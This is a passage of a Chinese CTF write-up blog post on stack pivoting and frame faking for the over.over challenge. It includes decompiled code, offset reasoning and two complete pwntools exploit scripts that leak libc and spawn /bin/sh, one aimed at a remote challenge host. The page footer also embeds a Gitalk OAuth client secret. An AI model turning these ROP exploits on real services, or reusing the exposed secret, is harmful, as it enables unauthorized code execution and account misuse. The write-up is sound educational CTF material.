+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( sub_400676() )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400676</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">96uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个题的思路是泄露libc执行execve，但可以看出read读96字节但buf长度已经有80字节，所以只能通过覆盖saved rbp和retaddr来劫持<code>RBP</code><br>我们向buf上写入rop链，然后劫持<code>RSP</code>和<code>RBP</code>到此处，这就需要我们知道buf的地址</p>
+<h5 id="leak-stack"><a href="#leak-stack" class="headerlink" title="leak stack"></a>leak stack</h5><p>我们使用<code>puts</code>函数泄露出saved rbp，然后就能根据saved rbp的值推算出栈上各个数据的地址</p>
+<p>我们leak的时候靠的是运行<code>sub_400676()</code>这个函数中的puts函数，而传给puts的参数是位于<code>sub_400676</code>栈上的<code>buf</code>，<code>buf</code>挨着的是<code>sub_400676</code>栈上的saved rbp，而这个saved rbp是主调函数的，也就是<code>main</code>函数的<code>RBP</code>。我们需要计算<code>main</code>函数的<code>RBP</code>地址到<code>buf</code>的长度，<code>main</code>函数的<code>RBP</code>减去长度值即得到<code>buf</code>的地址。</p>
+<p>一种简单的计算方法是调试，在<code>main</code>函数下断点看看<code>RBP</code>的值，然后运行到<code>sub_400676</code>看看<code>buf</code>的地址，直接一减就出来了。</p>
+<p>另一种方法是看汇编，<code>main</code>函数中:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006C1                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006C4                 sub     rsp, 10h</span><br></pre></td></tr></table></figure></div>
+
+<p>这使<code>RBP</code>的值固定，<code>RSP</code>减0x10，也就是说<code>main</code>函数中<code>RSP</code>到<code>RBP</code>距离为0x10</p>
+<p>随后运行到<code>call sub_400676()</code>：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400676                 push    rbp</span><br><span class="line">.text:0000000000400677                 mov     rbp, rsp</span><br><span class="line">.text:000000000040067A                 sub     rsp, 50h</span><br></pre></td></tr></table></figure></div>
+
+<p>这使得<code>RSP</code>向下移动了0x8+0x8+0x50&#x3D;0x60。其中第一个0x8是<code>call</code>指令把返回地址压栈造成的</p>
+<p>所以<code>RSP</code>到最初<code>main</code>函数<code>RBP</code>的距离是0x10+0x60&#x3D;0x70</p>
+<p>当我们泄露出<code>main</code>函数的<code>RBP</code>，我们对其减0x70，就能得到<code>buf</code>的地址了</p>
+<h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><p>本地打：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&quot;./over.over&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;for debug</span></span><br><span class="line"><span class="string">def DEBUG(cmd):</span></span><br><span class="line"><span class="string">    raw_input(&quot;DEBUG: &quot;)</span></span><br><span class="line"><span class="string">    gdb.attach(io, cmd)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">libc = elf.libc <span class="comment"># 本地打，可以直接获取libc</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">80</span>)</span><br><span class="line"><span class="comment"># 不能使用sendline，因为回车会影响read的读入。如果使用sendline，那么回车&quot;\x0a&quot;会被作为数据录入，直接影响到saved rbp</span></span><br><span class="line"></span><br><span class="line">buf = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line"><span class="comment"># 这个程序本身会调用puts打印出我们输入的东西，而puts只有遇到&quot;\0&quot;才会停</span></span><br><span class="line"><span class="comment"># 我们用0x80个a把栈空间填满，于是puts就会一直打印直到遇到&quot;\0&quot;</span></span><br><span class="line"><span class="comment"># 而后面就是8字节的saved rbp，会被puts泄露出来</span></span><br><span class="line"><span class="comment"># 栈是由高地址向低地址生长，其最高字节一定是&quot;\x7f&quot;</span></span><br><span class="line"><span class="comment"># 根据小端序&quot;高高低低&quot;，&quot;\x7f&quot;在高地址也就是泄露出来的8字节的最后一个字节，故recvuntil(b&quot;\x7f&quot;)</span></span><br><span class="line"><span class="comment"># 至于这里为什么切最后6个字节，原因是x64规定内存地址不能大于 0x00007FFFFFFFFFFF</span></span><br><span class="line"><span class="comment"># 6个字节长度，否则会抛出异常。所以栈地址一定保存在最后6字节中</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;buf -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(buf))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400793</span></span><br><span class="line">leave_ret = <span class="number">0x4006be</span></span><br><span class="line"><span class="comment">#  DEBUG(&quot;b *0x4006B9\nc&quot;)</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;11111111&#x27;</span>, pop_rdi_ret, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x400676</span>, (<span class="number">80</span> - <span class="number">40</span>) * <span class="string">b&#x27;1&#x27;</span>, buf, leave_ret])</span><br><span class="line"><span class="comment"># 这个payload先倒着看，依次对应的是retaddr和saved rbp</span></span><br><span class="line"><span class="comment"># 首先pop rbp使rbp指向buf，也就是payload写进栈中的&quot;11111111&quot;那个位置</span></span><br><span class="line"><span class="comment"># 然后ret到leave_ret，执行leave使rsp也指向buf，随后pop rbp把&quot;11111111&quot;弹出，rsp指向pop_rdi_ret</span></span><br><span class="line"><span class="comment"># ret到pop_rdi_ret，把puts的got表载入rdi，再ret调用puts来泄露got表得到偏移量</span></span><br><span class="line"><span class="comment"># puts再ret回到sub_400676了</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这一步是实际地址减去偏移量得到libc基址</span></span><br><span class="line"><span class="string">libc被加载到内存中的动态链接区域，这个区域在栈的下方，所以这里也使用&quot;\x7f&quot;作为结束符接受</span></span><br><span class="line"><span class="string">对应的，对于32位程序，需要使用&quot;\xf7&quot;</span></span><br><span class="line"><span class="string">u32(r.recvuntil(&#x27;\xf7&#x27;)[-4:])</span></span><br><span class="line"><span class="string">+-------------------+  &lt;--- 高地址</span></span><br><span class="line"><span class="string">|       栈区        |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|   动态链接区域    |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|       堆区        |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">|                   |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|       数据区      |</span></span><br><span class="line"><span class="string">|  (data + bss)     |</span></span><br><span class="line"><span class="string">+-------------------+</span></span><br><span class="line"><span class="string">|       代码区      |</span></span><br><span class="line"><span class="string">+-------------------+  &lt;--- 低地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;每台机子不一样</span></span><br><span class="line"><span class="string">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;|grep -E &quot;rsi|rdx&quot;</span></span><br><span class="line"><span class="string">0x0000000000090528 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000011f497 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x0000000000090529 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000108b13 : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000002a743 : pop rsi ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x000000000002a3e3 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rsi_ret=libc.address+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_rbx_ret = libc.address+<span class="number">0x90529</span></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;/bin/sh &quot;</span>,<span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;execve&quot;</span>, <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;execve&#x27;</span>]))</span><br><span class="line">payload=flat([<span class="string">b&#x27;22222222&#x27;</span>, pop_rdi_ret, <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)),pop_rsi_ret,p64(<span class="number">0</span>),pop_rdx_rbx_ret,p64(<span class="number">0</span>),p64(<span class="number">0xdeadbeef</span>), libc.sym[<span class="string">&#x27;execve&#x27;</span>], (<span class="number">80</span> - <span class="number">9</span>*<span class="number">8</span> ) * <span class="string">b&#x27;2&#x27;</span>, buf - <span class="number">0x30</span>, <span class="number">0x4006be</span>])</span><br><span class="line"><span class="comment"># 此payload和之前的类似，但不同之处是最后是buf - 0x30</span></span><br><span class="line"><span class="comment"># 观察上一个payload，第一次pop rbp时rsp指向payload中的buf位置</span></span><br><span class="line"><span class="comment"># 执行完puts到最后程序ret又回到了sub_400676</span></span><br><span class="line"><span class="comment"># [b&#x27;11111111&#x27;, pop_rdi_ret, elf.got[&#x27;puts&#x27;], elf.plt[&#x27;puts&#x27;], 0x400676, (80 - 40) * b&#x27;1&#x27;, buf, leave_ret]</span></span><br><span class="line"><span class="comment"># 回想当我们正常进入sub_400676时push rbp之前，rsp指向的是payload中的leave_ret</span></span><br><span class="line"><span class="comment"># 而我们上一次通过ret进入sub_400676时push rbp之前，rsp指向payload中的0x400676的末尾</span></span><br><span class="line"><span class="comment"># 这两次rsp相差 (80 - 40) * &#x27;1&#x27;+ buf两段数据长0x30，也就是说rsp向下移动了0x30</span></span><br><span class="line"><span class="comment"># 所以第二次payload的&quot;22222222&quot;的填入地址减小了0x30</span></span><br><span class="line"><span class="comment"># 如果想不通就用gdb调试下，直接下断点看rsp值</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>远程打：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.binary = <span class="string">&quot;./over.over&quot;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./over.over&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;114.51.41.9&quot;</span>, <span class="number">11451</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">80</span>)</span><br><span class="line">buf = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;buf -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(buf))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400793</span></span><br><span class="line">leave_ret = <span class="number">0x4006be</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;11111111&#x27;</span>, pop_rdi_ret, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], <span class="number">0x400676</span>, (<span class="number">80</span> - <span class="number">40</span>) * <span class="string">b&#x27;1&#x27;</span>, buf, leave_ret])</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="comment">#bin_sh = libc.dump(&quot;str_bin_sh&quot;) + base</span></span><br><span class="line">system = libc.dump(<span class="string">&quot;system&quot;</span>) + base</span><br><span class="line"><span class="comment"># 远程打用execve要三个参数，有时找gadgets得用libc，就得去下载相应的libc，所以能用system就用system</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">❯ ROPgadget --binary over.over --only &quot;ret&quot;</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000400509 : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ret = <span class="number">0x400509</span> <span class="comment"># 栈对齐</span></span><br><span class="line">payload=flat([<span class="string">b&#x27;/bin/sh\0&#x27;</span>, pop_rdi_ret, p64(buf-<span class="number">0x30</span>), ret, system, (<span class="number">80</span> - <span class="number">8</span>*<span class="number">5</span>)*<span class="string">b&quot;a&quot;</span>, buf - <span class="number">0x30</span>, leave_ret])</span><br><span class="line"><span class="comment"># 把字符串存栈里调用也可以</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="待添加"><a href="#待添加" class="headerlink" title="待添加"></a>待添加</h3>
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 花式栈溢出</li>
+        <li><strong>作者:</strong> Hexrotor</li>
+        <li><strong>创建于
+                :</strong> 2023-04-24 20:37:48</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-10-23 22:07:49
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://hexrotor.github.io/2023/04/24/stackoverflow-tips/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+            本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a> 进行许可。
+            
+
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Pwn/">#Pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/04/28/zsh-config/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">zsh 配置</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/03/01/miRouterLogin/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">小米路由器登录脚本</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;评论
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: '5ccd740d2c03314bbeec',
+                    clientSecret: '1c43b03d3070a4c0b688a91e470b47011c0e0dc1',
+                    repo: 'blogsrc',
+                    owner: 'Hexrotor',
+                    admin: ['Hexrotor'],
+                    id: __gitalk__pathname,
+                    language: 'zh-CN'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">花式栈溢出</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E8%BD%AC%E7%A7%BB"><span class="nav-text">栈转移</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#X-CTF-Quals-2016-b0verfl0w"><span class="nav-text">X-CTF Quals 2016 - b0verfl0w</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frame-faking-%E6%A0%88%E4%BC%AA%E9%80%A0"><span class="nav-text">frame faking(栈伪造)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2018-%E5%AE%89%E6%81%92%E6%9D%AF-over-over"><span class="nav-text">2018 安恒杯 over.over</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#leak-stack"><span class="nav-text">leak stack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exp%EF%BC%9A"><span class="nav-text">exp：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BE%85%E6%B7%BB%E5%8A%A0"><span class="nav-text">待添加</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 1s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">HexrotorのBlog</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.4.4</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex justify-center items-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="fa-regular fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
